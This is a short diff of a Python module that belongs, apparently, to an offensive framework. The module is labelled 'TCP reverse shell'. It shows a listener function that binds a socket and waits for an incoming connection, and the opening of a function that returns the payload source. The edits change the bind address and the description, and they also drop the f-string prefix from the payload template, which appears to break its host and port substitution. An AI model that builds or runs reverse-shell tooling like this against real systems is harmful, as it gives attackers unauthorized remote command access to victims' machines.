@@ -1,7 +1,7 @@
 
 #basic module description
 def description():
-    return "Reverse TCP Win64"
+    return "TCP reverse shell"
 
 #basic module rank
 def rank():
@@ -28,7 +28,7 @@ def main(ip, port):
     try:
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind(("0.0.0.0", port))
+        s.bind((ip, port))
         s.listen(1)
         print(f"{evnt()} Listening for incoming connection...")
         conn, addr = s.accept()
@@ -50,7 +50,7 @@ def launch(args):
 
 #source code (only for payloads)
 def code(rhost, rport):
-    return f"""
+    return """
 import socket
 import subprocess
 import os
